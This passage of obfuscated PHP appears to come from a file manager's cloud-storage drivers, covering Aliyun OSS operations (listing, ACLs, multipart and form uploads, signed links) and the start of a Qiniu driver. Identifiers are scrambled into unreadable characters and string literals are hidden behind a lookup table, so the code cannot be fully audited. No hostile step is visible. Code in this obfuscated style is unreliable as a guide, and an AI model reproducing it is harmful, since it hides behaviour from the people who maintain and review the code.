$Òø˜…[$õ°â†Í¡[85]]; } if (isset($Òø˜…[$õ°â†Í¡[201]])) { $‡õ”Ãä³[$õ°â†Í¡[201]] = $Òø˜…[$õ°â†Í¡[201]]; } return $‡õ”Ãä³; } public function listPath($·êèïÁİ, $ûªı¥åâ = false) { $Ò™ó· =& $_SERVER[ï»»·÷á]; $ÍÓÕ©îŞ = $this->fileList($·êèïÁİ, $Ò™ó·[8], !0); foreach ($ÍÓÕ©îŞ[$Ò™ó·[82]] as $ÉÔÄ¦·é => $ÃºÜ•İ¯) { $ÍÓÕ©îŞ[$Ò™ó·[82]][$ÉÔÄ¦·é] = $this->folderInfo($ÃºÜ•İ¯, $ûªı¥åâ, $ÃºÜ•İ¯); } foreach ($ÍÓÕ©îŞ[$Ò™ó·[83]] as $ÉÔÄ¦·é => $ÃºÜ•İ¯) { $ÍÓÕ©îŞ[$Ò™ó·[83]][$ÉÔÄ¦·é] = $this->fileInfo($ÃºÜ•İ¯[$Ò™ó·[32]], $ûªı¥åâ, $ÃºÜ•İ¯); } return $ÍÓÕ©îŞ; } protected function infoChildren($öâÑğ ü, &$ïğÎ®“) { $‡¡ß¿Ç“ =& $_SERVER[ï»»·÷á]; $›³šğ…Ç = $this->fileList($öâÑğ ü, $‡¡ß¿Ç“[12], !0); $ïğÎ®“[$‡¡ß¿Ç“[78]] += count($›³šğ…Ç[$‡¡ß¿Ç“[82]]); $ïğÎ®“[$‡¡ß¿Ç“[77]] += count($›³šğ…Ç[$‡¡ß¿Ç“[83]]); foreach ($›³šğ…Ç[$‡¡ß¿Ç“[83]] as $’ª³¦Ú¶) { if (!$’ª³¦Ú¶ || !$’ª³¦Ú¶[$‡¡ß¿Ç“[76]]) { continue; } $ïğÎ®“[$‡¡ß¿Ç“[76]] += $’ª³¦Ú¶[$‡¡ß¿Ç“[76]]; } } public function has($£ãİ¤”°, $İ÷Ò°Â = false, $â¦åä¥€ = true) { $óÍƒòü =& $_SERVER[ï»»·÷á]; $£ãİ¤”° = trim($£ãİ¤”°, $óÍƒòü[8]); $‹á™¸Óº = empty($£ãİ¤”°) && $£ãİ¤”° !== $óÍƒòü[198] ? $óÍƒòü[12] : $£ãİ¤”° . $óÍƒòü[8]; $Ÿå·Õ¬¦ = $óÍƒòü[12]; $µ¿¹Ñæ÷ = 500; $ÏîÉÁí§ = $ÔÔö¹—ë = 0; while (!0) { check_abort(); $Î¨ ÑÌÖ = array($óÍƒòü[1415] => $óÍƒòü[8], $óÍƒòü[1416] => $‹á™¸Óº, $óÍƒòü[1417] => $µ¿¹Ñæ÷, $óÍƒòü[1418] => $Ÿå·Õ¬¦); try { $·çşë‚ = $this->client->listObjects($this->bucket, $Î¨ ÑÌÖ); } catch (OSS\Core\OssException $ãÖ ïÜ) { break; } $Ÿå·Õ¬¦ = $·çşë‚->getNextMarker(); $„‘³¥† = $·çşë‚->getObjectList(); $Á¯Õ±ğÂ = $·çşë‚->getPrefixList(); if ($İ÷Ò°Â) { if (count($„‘³¥†) > 1 || count($„‘³¥†) == 1 && $„‘³¥†[0]->getKey() != $‹á™¸Óº) { $ÏîÉÁí§ += count($„‘³¥†) - 1; } if (!empty($Á¯Õ±ğÂ)) { $ÔÔö¹—ë += count($Á¯Õ±ğÂ); } if ($Ÿå·Õ¬¦ === $óÍƒòü[12]) { break; } continue; } if ($â¦åä¥€) { if (!empty($„‘³¥†)) { if (count($„‘³¥†) > 1 || $„‘³¥†[0]->getKey() != $‹á™¸Óº) { return !0; } } } else { if (!empty($Á¯Õ±ğÂ)) { return !0; } } if ($Ÿå·Õ¬¦ === $óÍƒòü[12]) { break; } } if ($İ÷Ò°Â) { return array($óÍƒòü[207] => $ÏîÉÁí§, $óÍƒòü[208] => $ÔÔö¹—ë); } return !1; } public function listAll($¥¿Œ¤) { $îÁ¸¡À– =& $_SERVER[ï»»·÷á]; $«çŠÖ¬ = $this->fileList($¥¿Œ¤, $îÁ¸¡À–[12], !0); $Á×Ÿü•… = array_to_keyvalue($«çŠÖ¬[$îÁ¸¡À–[83]], $îÁ¸¡À–[32]); foreach ($«çŠÖ¬[$îÁ¸¡À–[82]] as $ï¨îéÕÒ) { if (is_string($ï¨îéÕÒ)) { $Á×Ÿü•…[$ï¨îéÕÒ] = array($îÁ¸¡À–[76] => 0); } } return $this->listAllFiles($¥¿Œ¤, $Á×Ÿü•…); } public function canRead($÷ÁÀµ‡º) { $ƒ¨»®µ =& $_SERVER[ï»»·÷á]; $ƒñÊ¡¬ = $this->pathAcl($÷ÁÀµ‡º); return $ƒñÊ¡¬ == $ƒ¨»®µ[1428] || $ƒñÊ¡¬ == $ƒ¨»®µ[556] ? !0 : !1; } public function canWrite($àËç”Ùô) { $¢ªáş ° = $this->pathAcl($àËç”Ùô); return $¢ªáş ° == $_SERVER[ï»»·÷á][556] ? !0 : !1; } public function pathAcl($ä¡„¿Ã‹) { $Ï½ö°‚ =& $_SERVER[ï»»·÷á]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $êı²Ş°© = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ä¡„¿Ã‹)); } catch (OSS\Core\OssException $¤Ü¥ë‘¸) { return !1; } $—–äÔÔÏ = $êı²Ş°© == $Ï½ö°‚[37] ? $this->bucketAcl : $êı²Ş°©; if ($—–äÔÔÏ == $Ï½ö°‚[1429]) { return $Ï½ö°‚[1428]; } if ($—–äÔÔÏ == $Ï½ö°‚[1430]) { return $Ï½ö°‚[556]; } return $—–äÔÔÏ; } private function chmodPath($¤Üúå…Ğ, $„ŒƒÒæÄ = '') { $ÈãƒóğÃ =& $_SERVER[ï»»·÷á]; $¨›¸š÷Í = empty($„ŒƒÒæÄ) ? $ÈãƒóğÃ[1430] : $„ŒƒÒæÄ; $Õ“Æù  = array($ÈãƒóğÃ[37], $ÈãƒóğÃ[199], $ÈãƒóğÃ[1429], $ÈãƒóğÃ[1430]); if (!in_array($¨›¸š÷Í, $Õ“Æù )) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($¤Üúå…Ğ), $¨›¸š÷Í); } catch (OSS\Core\OssException $åÌ•æ“ï) { return !1; } return !0; } public function getContent($¹×§¬·Ú) { return $this->fileSubstr($¹×§¬·Ú, -1); } public function setContent($ÏïĞ³ Ù, $…§ãƒ¡è = '') { $òÖò×•¾ =& $_SERVER[ï»»·÷á]; try { $×ñ½à•û = $this->trafficLimit($òÖò×•¾[1431]); $ÒÒ­Œ¹ = $this->client->putObject($this->bucket, $this->pathEncode($ÏïĞ³ Ù), $…§ãƒ¡è, $×ñ½à•û); } catch (OSS\Core\OssException $å¦èú¡Ç) { return !1; } $å¶¦ÏşÈ = array($òÖò×•¾[1421] => trim($ÒÒ­Œ¹[$òÖò×•¾[1432]], $òÖò×•¾[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÏïĞ³ Ù))); $this->updateObjMeta($ÏïĞ³ Ù, $å¶¦ÏşÈ); return isset($ÒÒ­Œ¹[$òÖò×•¾[1433]][$òÖò×•¾[1380]]) ? !0 : !1; } private function updateObjMeta($îŒŠÒº­, $œ—ˆ¦Üû) { $îŒŠÒº­ = $this->pathEncode($îŒŠÒº­); try { $Ø“ú™ = array(OSS\OssClient::OSS_HEADERS => $œ—ˆ¦Üû); $this->client->copyObject($this->bucket, $îŒŠÒº­, $this->bucket, $îŒŠÒº­, $Ø“ú™); } catch (OSS\Core\OssException $“Åé…µÃ) { return !1; } return !0; } public function upload($æÛ©Ü·¯, $Ø¼Òø°Š, $ó†Ä–‚“ = false, $œÈùİ«€ = REPEAT_REPLACE) { $ğÊÈ¶ãÂ =& $_SERVER[ï»»·÷á]; $®…¡“ØØ = trim($æÛ©Ü·¯, $ğÊÈ¶ãÂ[8]); $ôĞóŒ¦Â = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ğÊÈ¶ãÂ[1421] => @md5_file($Ø¼Òø°Š)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($æÛ©Ü·¯))); $ôĞóŒ¦Â = $this->trafficLimit($ğÊÈ¶ãÂ[1431], $ôĞóŒ¦Â); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($®…¡“ØØ), $Ø¼Òø°Š, $ôĞóŒ¦Â); } catch (OSS\Core\OssException $»¹Ë·­£) { return !1; } return $this->getPathOuter($æÛ©Ü·¯); } public function getHost() { $Ì­ËŞ =& $_SERVER[ï»»·÷á]; $ºœ¬šªÊ = explode($Ì­ËŞ[184], parent::getHost()); return $ºœ¬šªÊ[0] . $Ì­ËŞ[184] . $this->bucket . $Ì­ËŞ[10] . $ºœ¬šªÊ[1]; } public function uploadFormData($³ğ”Š¹‹, $ÍÛôºÀ÷ = 3600) { $¶µú¶şì =& $_SERVER[ï»»·÷á]; if (!($¤ÉÈıÓÕ = $this->getHost())) { return !1; } $õåÂæåâ = $ÍÛôºÀ÷; $Œı¨òŞ¿ = date($¶µú¶şì[1434], time() + $õåÂæåâ); $“óÆèÆº = new DateTime($Œı¨òŞ¿); $×óéä†µ = $“óÆèÆº->format(DateTime::ISO8601); $ûà£¡ = strpos($×óéä†µ, $¶µú¶şì[296]); $×óéä†µ = substr($×óéä†µ, 0, $ûà£¡) . $¶µú¶şì[1435]; $ÚºÊ«ãË = 1048576000 * 5; $ß£­°æ¡ = $this->pathFather($³ğ”Š¹‹); $£·ã†Ï¾ = array($¶µú¶şì[1334] => $×óéä†µ, $¶µú¶şì[1335] => array(array($¶µú¶şì[1436], 0, $ÚºÊ«ãË), array($¶µú¶şì[1338], $¶µú¶şì[1339], $ß£­°æ¡))); $œôÁÊ¨ = base64_encode(json_encode($£·ã†Ï¾)); $æî®É¢“ = base64_encode(hash_hmac($¶µú¶şì[232], $œôÁÊ¨, $this->secret, !0)); $¹›ÁĞÁÛ = array($¶µú¶şì[1344] => $œôÁÊ¨, $¶µú¶şì[1437] => $this->accessKey, $¶µú¶şì[1340] => $¶µú¶şì[1332], $¶µú¶şì[1438] => $æî®É¢“, $¶µú¶şì[182] => $¤ÉÈıÓÕ); $¹›ÁĞÁÛ = $this->trafficLimit($¶µú¶şì[1431], $¹›ÁĞÁÛ); return $¹›ÁĞÁÛ; } public function multiUploadFormData($ıœ‰â˜Ï, $Ÿ¡ØÙÄ® = 3600) { $ğñ„…‰Ñ =& $_SERVER[ï»»·÷á]; if (!($œøçëÆŸ = $this->getHost())) { return !1; } $ ¡¥È– = $this->trafficLimit($ğñ„…‰Ñ[1431]); $‹Åñ²·¢ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ıœ‰â˜Ï), $ ¡¥È–); return array($ğñ„…‰Ñ[223] => $‹Åñ²·¢, $ğñ„…‰Ñ[182] => $œøçëÆŸ . $ğñ„…‰Ñ[8] . $this->pathEncode($ıœ‰â˜Ï), $ğñ„…‰Ñ[224] => gmdate($ğñ„…‰Ñ[1439]), $ğñ„…‰Ñ[94] => $ıœ‰â˜Ï); } public function multiUploadAuthData($—‚øŸª, $‘ÉÎğñö = array()) { $èˆÂù =& $_SERVER[ï»»·÷á]; $Ïã¶¬€ƒ = isset($‘ÉÎğñö[$èˆÂù[224]]) ? $‘ÉÎğñö[$èˆÂù[224]] : gmdate($èˆÂù[1439]); $ƒ­±ñ¦ = isset($‘ÉÎğñö[$èˆÂù[174]]) ? $‘ÉÎğñö[$èˆÂù[174]] : $èˆÂù[12]; $¤ÓıŒ½… = $—‚øŸª; if (isset($‘ÉÎğñö[$èˆÂù[94]])) { $¤ÓıŒ½… = $‘ÉÎğñö[$èˆÂù[94]]; unset($‘ÉÎğñö[$èˆÂù[94]]); } if (isset($‘ÉÎğñö[$èˆÂù[225]])) { $‘ÉÎğñö[$èˆÂù[224]] = $Ïã¶¬€ƒ; return $this->listUploadParts($¤ÓıŒ½…, $‘ÉÎğñö); } $³”¸»î = array($èˆÂù[226], $èˆÂù[12], $èˆÂù[120], $Ïã¶¬€ƒ, "\x78\55\x6f\163\x73\55\x64\141\x74\x65\x3a{$Ïã¶¬€ƒ}", $èˆÂù[8] . $this->bucket . $èˆÂù[8] . $¤ÓıŒ½… . $ƒ­±ñ¦); if (strpos($ƒ­±ñ¦, $èˆÂù[227]) === 0) { $³”¸»î[0] = $èˆÂù[228]; if ($¶ÅÆë¿Ø = $this->trafficLimit($èˆÂù[1431])) { $¤ÓıŒ½… = $èˆÂù[1440]; array_splice($³”¸»î, 5, 0, $¤ÓıŒ½… . $èˆÂù[4] . $¶ÅÆë¿Ø[$¤ÓıŒ½…]); } } if (isset($‘ÉÎğñö[$èˆÂù[229]]) && $‘ÉÎğñö[$èˆÂù[229]] == $èˆÂù[230]) { $³”¸»î[0] = $èˆÂù[230]; } if (!empty($‘ÉÎğñö[$èˆÂù[1441]])) { $ÃÈ­ Ã = array_merge(array($³”¸»î[4]), $‘ÉÎğñö[$èˆÂù[1441]]); sort($ÃÈ­ Ã); $³”¸»î[4] = implode($èˆÂù[231], $ÃÈ­ Ã); } $ë«ÂÉÍÈ = implode($èˆÂù[231], $³”¸»î); $¾¯Ÿ™Éã = base64_encode(hash_hmac($èˆÂù[232], $ë«ÂÉÍÈ, $this->secret, !0)); $½ÑªÑİ° = $èˆÂù[1405] . $this->accessKey . $èˆÂù[4] . $¾¯Ÿ™Éã; if (strpos($ƒ­±ñ¦, $èˆÂù[227]) === 0) { $½ÑªÑİ° = array($èˆÂù[234] => $½ÑªÑİ°, $èˆÂù[224] => $Ïã¶¬€ƒ); if ($¶ÅÆë¿Ø) { $½ÑªÑİ° = array_merge($½ÑªÑİ°, $¶ÅÆë¿Ø); } } return $½ÑªÑİ°; } public function listUploadParts($˜ÊÁÖ¶², $¸•—»Æ†) { $ŞóñÖ‰ =& $_SERVER[ï»»·÷á]; $Àìè÷£› = parse_url_query($¸•—»Æ†[$ŞóñÖ‰[174]]); $ŞõÏ—¤ê = $this->client->listParts($this->bucket, $this->pathEncode($˜ÊÁÖ¶²), $Àìè÷£›[$ŞóñÖ‰[223]]); $¡™„óÚş = $ŞõÏ—¤ê->getListPart(); $Ë·ìÁÔş = array(); foreach ($¡™„óÚş as $ ´úø¬×) { $Ë·ìÁÔş[] = array($ŞóñÖ‰[1425] => $ ´úø¬×->getPartNumber(), $ŞóñÖ‰[1426] => trim($ ´úø¬×->getETag(), $ŞóñÖ‰[118])); } unset($¸•—»Æ†[$ŞóñÖ‰[225]], $¸•—»Æ†[$ŞóñÖ‰[229]]); $‡†Ø¤  = $this->multiUploadAuthData($˜ÊÁÖ¶², $¸•—»Æ†); if (empty($‡†Ø¤ )) { return !1; } return array($ŞóñÖ‰[234] => $‡†Ø¤ , $ŞóñÖ‰[224] => $¸•—»Æ†[$ŞóñÖ‰[224]], $ŞóñÖ‰[236] => $Ë·ìÁÔş); } public function download($¯ü¢„ë·, $ÇÓ“úÙ) { if ($this->isFolder($¯ü¢„ë·)) { return !1; } try { $«÷ıøÌ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ÇÓ“úÙ); $«÷ıøÌ = $this->trafficLimit($_SERVER[ï»»·÷á][109], $«÷ıøÌ); $this->client->getObject($this->bucket, $this->pathEncode($¯ü¢„ë·), $«÷ıøÌ); } catch (OSS\Core\OssException $”¸ß—ıî) { return !1; } return $ÇÓ“úÙ; } public function fileSubstr($éÕÌ±ù³, $Ùû©ºã§ = 0, $õşÉÜÛ = false) { if ($Ùû©ºã§ === -1) { $åŸğş‡¼ = array(); } else { if ($õşÉÜÛ === !1) { $÷«Îè–µ = $this->size($éÕÌ±ù³); } else { $÷«Îè–µ = $Ùû©ºã§ + $õşÉÜÛ - 1; } $åŸğş‡¼ = array(OSS\OssClient::OSS_RANGE => "{$Ùû©ºã§}\55{$÷«Îè–µ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($éÕÌ±ù³), $åŸğş‡¼); } catch (OSS\Core\OssException $áÔùÔê) { think_exception($áÔùÔê->getMessage()); return !1; } } private function trafficLimit($îá‰÷Şù, $¶…³˜» = array()) { $ßÈçè¥€ =& $_SERVER[ï»»·÷á]; if ($îá‰÷Şù == $ßÈçè¥€[1431] && $this->isUploadServer() || $îá‰÷Şù == $ßÈçè¥€[109] && $this->isFileOutServer()) { return $¶…³˜»; } $¢§²İç = floatval($GLOBALS[$ßÈçè¥€[6]][$ßÈçè¥€[89]][$ßÈçè¥€[107]][$îá‰÷Şù]) * 1024 * 1024 * 8; if (!$¢§²İç) { return $¶…³˜»; } $¢§²İç = $¢§²İç < 819200 ? 819200 : ($¢§²İç > 838860800 ? 838860800 : $¢§²İç); $¶…³˜»[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¢§²İç); return $¶…³˜»; } public function link($ä™ÈÛı•, $í¹©Èùœ = array()) { $ÇÙÄÍò =& $_SERVER[ï»»·÷á]; if (!$this->exist($ä™ÈÛı•) || $this->isFolder($ä™ÈÛı•)) { return !1; } try { $í¹©Èùœ = $this->trafficLimit($ÇÙÄÍò[109], $í¹©Èùœ); $ØŸıÉõÇ = $this->client->signUrl($this->bucket, $this->pathEncode($ä™ÈÛı•), 3600 * 12, $ÇÙÄÍò[230], $í¹©Èùœ); return $this->getCdnLink($ØŸıÉõÇ); } catch (OSS\Core\OssException $Æ€™Û) { return !1; } } public function fileOut($«Å·ç²ö, $ÖòËÁš = false, $¸Ö÷ªî = false, $ĞÍ¹¿€ñ = '') { $ÆÔ’×ÌÇ =& $_SERVER[ï»»·÷á]; if ($this->isFileOutServer()) { return $this->fileOutServer($«Å·ç²ö, $ÖòËÁš, $¸Ö÷ªî, $ĞÍ¹¿€ñ); } if (!$¸Ö÷ªî) { $¸Ö÷ªî = $this->pathThis($«Å·ç²ö); } $¸Ö÷ªî = rawurlencode($¸Ö÷ªî); $ù»Çß§¹ = get_file_mime(get_path_ext($¸Ö÷ªî)); if ($ù»Çß§¹ == $ÆÔ’×ÌÇ[217]) { return parent::fileOut($«Å·ç²ö, $ÖòËÁš, $¸Ö÷ªî, $ĞÍ¹¿€ñ); } $ÖòËÁš = $ÖòËÁš ? $ÆÔ’×ÌÇ[1442] : $ÆÔ’×ÌÇ[1443]; $ı³şğ…ª = array(OSS\OssClient::OSS_SUB_RESOURCE => $ÆÔ’×ÌÇ[1444] . rawurlencode("{$ÖòËÁš}\x3b\x66\151\x6c\x65\156\x61\155\145\75{$¸Ö÷ªî}")); $ı³şğ…ª[OSS\OssClient::OSS_SUB_RESOURCE] .= $ÆÔ’×ÌÇ[1445] . rawurlencode($ù»Çß§¹); $²¼ª â = $this->link($«Å·ç²ö, $ı³şğ…ª); $this->fileOutLink($²¼ª â); } public function fileOutServer($û±û™¬Ã, $Ñ…Ñ¾¢ = false, $ÈÕöŒ†È = false, $§¥ü½•‹ = '') { parent::fileOut($û±û™¬Ã, $Ñ…Ñ¾¢, $ÈÕöŒ†È, $§¥ü½•‹); } public function fileOutImage($øâÖîé, $ªï·ƒáÄ = 250) { $‚íŸâ£è = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ï»»·÷á][1446] . $ªï·ƒáÄ); $Îô›ğ‰Ò = $this->link($øâÖîé, $‚íŸâ£è); $this->fileOutLink($Îô›ğ‰Ò); } public function fileOutImageServer($˜²ç†·®, $æ¨¨¬ÖÄ = 250) { parent::fileOutImage($˜²ç†·®, $æ¨¨¬ÖÄ); } public function fileOutLink($Ç˜Êù¢¨) { $ÍÅ”Ê³È =& $_SERVER[ï»»·÷á]; if (!$this->isCdnHost() && substr($Ç˜Êù¢¨, 0, 7) == $ÍÅ”Ê³È[1347]) { $Ç˜Êù¢¨ = $ÍÅ”Ê³È[1348] . substr($Ç˜Êù¢¨, 7); } header($ÍÅ”Ê³È[161] . $Ç˜Êù¢¨); die; } public function hashMd5($‚ğİÀ•±, $ÓöÏ€ = '') { $Ø¨±¶½ =& $_SERVER[ï»»·÷á]; $‹äİê¿Œ = $this->_objectMeta($‚ğİÀ•±); if (!$‹äİê¿Œ) { return $Ø¨±¶½[12]; } if (!isset($‹äİê¿Œ[$Ø¨±¶½[1421]]) && !empty($ÓöÏ€)) { $ûåóœ§´ = $this->updateObjMeta($‚ğİÀ•±, array($Ø¨±¶½[1421] => $ÓöÏ€)); $‹äİê¿Œ[$Ø¨±¶½[1421]] = $ûåóœ§´ ? $ÓöÏ€ : $Ø¨±¶½[12]; } return isset($‹äİê¿Œ[$Ø¨±¶½[1421]]) ? strtolower($‹äİê¿Œ[$Ø¨±¶½[1421]]) : $Ø¨±¶½[12]; } public function size($ù‘„“ ) { $´ª¢¶ùİ = $this->objectMeta($ù‘„“ ); return $´ª¢¶ùİ ? $´ª¢¶ùİ[$_SERVER[ï»»·÷á][76]] : 0; } public function info($Ç˜œ™öé) { if ($this->isFolder($Ç˜œ™öé)) { return $this->folderInfo($Ç˜œ™öé); } else { if ($this->isFile($Ç˜œ™öé)) { return $this->fileInfo($Ç˜œ™öé); } } return !1; } public function exist($¾÷¿šïÍ) { return $this->isFile($¾÷¿šïÍ) || $this->isFolder($¾÷¿šïÍ); } public function isFile($â¥ëÜ¼) { return !$this->isFolder($â¥ëÜ¼) && $this->objectMeta($â¥ëÜ¼); } public function isFolder($ÕÇÕ¶) { return $this->cacheMethod($_SERVER[ï»»·÷á][165], $ÕÇÕ¶); } protected function objectMeta($ÒÈ·¾íÈ) { return $this->cacheMethod($_SERVER[ï»»·÷á][167], $ÒÈ·¾íÈ); } protected function _objectMeta($¢Ù’âú) { $è”ì…æÎ =& $_SERVER[ï»»·÷á]; try { $¯†«µÉ´ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($¢Ù’âú)); } catch (OSS\Core\OssException $éã¶åÑÈ) { $¯†«µÉ´ = !1; } if ($¯†«µÉ´) { $¯†«µÉ´[$è”ì…æÎ[76]] = intval($¯†«µÉ´[$è”ì…æÎ[1419]]); } return $¯†«µÉ´; } protected function _isFolder($¡¥áíó) { $À–ş¹½ä =& $_SERVER[ï»»·÷á]; if ($¡¥áíó == $À–ş¹½ä[12] || $¡¥áíó == $À–ş¹½ä[8]) { return !0; } $ıº”ğö´ = array($À–ş¹½ä[1415] => $À–ş¹½ä[8], $À–ş¹½ä[1416] => rtrim($¡¥áíó, $À–ş¹½ä[8]) . $À–ş¹½ä[8], $À–ş¹½ä[1417] => 1, $À–ş¹½ä[1418] => $À–ş¹½ä[12]); $Õ®Åªòã = $this->client->listObjects($this->bucket, $ıº”ğö´); if ($Õ®Åªòã->getObjectList() || $Õ®Åªòã->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ØÍ¢¾Ô) { parent::__construct(); require_once SDK_DIR . $_SERVER[ï»»·÷á][1447]; $this->_init($ØÍ¢¾Ô); } public function _init($µÉ½¨Òş) { $ŠãÀ‰ˆ =& $_SERVER[ï»»·÷á]; $this->config = $µÉ½¨Òş; foreach ($µÉ½¨Òş as $áœƒ§Ë˜ => $†¯ªæŠ) { if (isset($this->{$áœƒ§Ë˜})) { $this->{$áœƒ§Ë˜} = $†¯ªæŠ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ŠãÀ‰ˆ[1448] . LNG($ŠãÀ‰ˆ[1406])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Ö‡Í°ğ­, $Î‚ÚĞ“ƒ = '', $«ğä×Š¾ = REPEAT_RENAME) { if ($this->setContent($Ö‡Í°ğ­, $Î‚ÚĞ“ƒ)) { return $this->getPathOuter($Ö‡Í°ğ­); } return !1; } public function mkdir($¼ºšÉ«, $†ûªáùø = REPEAT_SKIP) { $äâÓÄ ˆ =& $_SERVER[ï»»·÷á]; $±…Šø÷ç = trim($¼ºšÉ«, $äâÓÄ ˆ[8]); if ($this->_isFolder($±…Šø÷ç)) { return $this->getPathOuter($±…Šø÷ç); } $¼ºšÉ« = $±…Šø÷ç . $äâÓÄ ˆ[8]; $ªêüõ£ = get_path_this($±…Šø÷ç); $şÏÜŠ— = $¼ºšÉ« . $ªêüõ£; if (!$this->mkfile($şÏÜŠ—)) { return !1; } if (!$this->moveFile($şÏÜŠ—, $¼ºšÉ«)) { $this->delFile($şÏÜŠ—); return !1; } return $this->getPathOuter($±…Šø÷ç); } public function copyFile($×”ˆŒèã, $¡áÎÍÃ) { $ä·ãçª = $this->bucketManager->copy($this->bucket, $×”ˆŒèã, $this->bucket, $¡áÎÍÃ, !0); return $ä·ãçª ? !1 : $this->getPathOuter($¡áÎÍÃ); } public function moveFile($³¦¨ö§©, $òëÄëÊö) { $†ÏúÈ„ = $this->bucketManager->move($this->bucket, $³¦¨ö§©, $this->bucket, $òëÄëÊö, !0); return $†ÏúÈ„ ? !1 : $this->getPathOuter($òëÄëÊö); } public function delFile($‹Ş£Æèá) { if (!$this->exist($‹Ş£Æèá)) { return !0; } $¾©¸ï€› = $this->bucketManager->delete($this->bucket, $‹Ş£Æèá); return $¾©¸ï€› ? !1 : !0; } public function delFolder($šûÜ¼´ç) { $Å•µâí =& $_SERVER[ï»»·÷á]; if (!$this->exist($šûÜ¼´ç)) { return !0; } $this->listItemCache = !1; $­ƒıÍ¸° = $this->fileList($šûÜ¼´ç); $this->listItemCache = !0; $è™²‚ùµ = trim($šûÜ¼´ç, $Å•µâí[8]) . $Å•µâí[8]; if (!empty($šûÜ¼´ç) && $šûÜ¼´ç !== $Å•µâí[198] && !in_array($è™²‚ùµ, $­ƒıÍ¸°[$Å•µâí[82]])) { $­ƒıÍ¸°[$Å•µâí[82]][] = $è™²‚ùµ; } $ïÙ‘¦ƒ— = $this->delByBatch($­ƒıÍ¸°[$Å•µâí[83]]); if (!$ïÙ‘¦ƒ—) { return !1; } $ïÙ‘¦ƒ— = $this->delByBatch($­ƒıÍ¸°[$Å•µâí[82]]); if (!$ïÙ‘¦ƒ—) { return !1; } return $this->delFile($è™²‚ùµ); } private function delByBatch($±ùğß) { foreach (array_chunk($±ùğß, 1000) as $á´½ƒÉ) { $ş°Ï®± = $this->bucketManager->buildBatchDelete($this->bucket, $á´½ƒÉ); list($¨æÅĞ»í, $¶µ‹ŒÈ¶) = $this->bucketManager->batch($ş°Ï®±); if ($¶µ‹ŒÈ¶) { return !1; } } return !0; } public function rename($Ëò¯ô×ô, $ƒú“ñ¡¦) { return $this->renameObject($Ëò¯ô×ô, $ƒú“ñ¡¦); } public function fileInfo($Œ³ÆÙ’å, $— ×ÒƒÃ = false, $‰€ÁÔ· = array()) { $ü¥´š•‚ =& $_SERVER[ï»»·÷á]; $Ÿê›‡»Æ = array($ü¥´š•‚[32] => $this->pathThis($Œ³ÆÙ’å), $ü¥´š•‚[84] => $this->getPathOuter($ü¥´š•‚[8] . $Œ³ÆÙ’å), $ü¥´š•‚[33] => $ü¥´š•‚[200], $ü¥´š•‚[76] => isset($‰€ÁÔ·[$ü¥´š•‚[1449]]) ? $‰€ÁÔ·[$ü¥´š•‚[1449]] : 0, $ü¥´š•‚[174] => $this->ext($Œ³ÆÙ’å)); if ($— ×ÒƒÃ) { return $Ÿê›‡»Æ; } $Ÿê›‡»Æ[$ü¥´š•‚[201]] = $Ÿê›‡»Æ[$ü¥´š•‚[85]] = 0; $Ÿê›‡»Æ[$ü¥´š•‚[202]] = $Ÿê›‡»Æ[$ü¥´š•‚[203]] = !0; if (empty($‰€ÁÔ·)) { $‰€ÁÔ· = $this->objectMeta($Œ³ÆÙ’å); if (!$‰€ÁÔ·) { return $Ÿê›‡»Æ; } } if (isset($‰€ÁÔ·[$ü¥´š•‚[1450]])) { $Ÿê›‡»Æ[$ü¥´š•‚[85]] = substr($‰€ÁÔ·[$ü¥´š•‚[1450]] . $ü¥´š•‚[12], 0, 10); } if (isset($‰€ÁÔ·[$ü¥´š•‚[1449]])) { $Ÿê›‡»Æ[$ü¥´š•‚[76]] = $‰€ÁÔ·[$ü¥´š•‚[1449]]; } return $Ÿê›‡»Æ; } public function folderInfo($½ÜÂ«…Û, $™ö»İÎ­ = false) { $á´ç¢Å¸ =& $_SERVER[ï»»·÷á]; $ü¼®¸¦ = array($á´ç¢Å¸[32] => $this->pathThis($½ÜÂ«…Û), $á´ç¢Å¸[84] => $this->getPathOuter($á´ç¢Å¸[8] . $½ÜÂ«…Û), $á´ç¢Å¸[33] => $á´ç¢Å¸[75]); if ($™ö»İÎ­) { return $ü¼®¸¦; } $ü¼®¸¦[$á´ç¢Å¸[201]] = $ü¼®¸¦[$á´ç¢Å¸[85]] = 0; $ü¼®¸¦[$á´ç¢Å¸[202]] = $ü¼®¸¦[$á´ç¢Å¸[203]] = !0; $½ÜÂ«…Û = rtrim($½ÜÂ«…Û, $á´ç¢Å¸[8]) . $á´ç¢Å¸[8]; $¯úÊœ³É = $this->objectMeta($½ÜÂ«…Û); if (isset($¯úÊœ³É[$á´ç¢Å¸[1450]])) { $ü¼®¸¦[$á´ç¢Å¸[85]] = substr($¯úÊœ³É[$á´ç¢Å¸[1450]] . $á´ç¢Å¸[12], 0, 10); } return $ü¼®¸¦; } public function listPath($×Ô÷Áú, $Ïı£•¼Ä = false) { $°»şåé =& $_SERVER[ï»»·÷á]; $¿£óœ¡¾ = 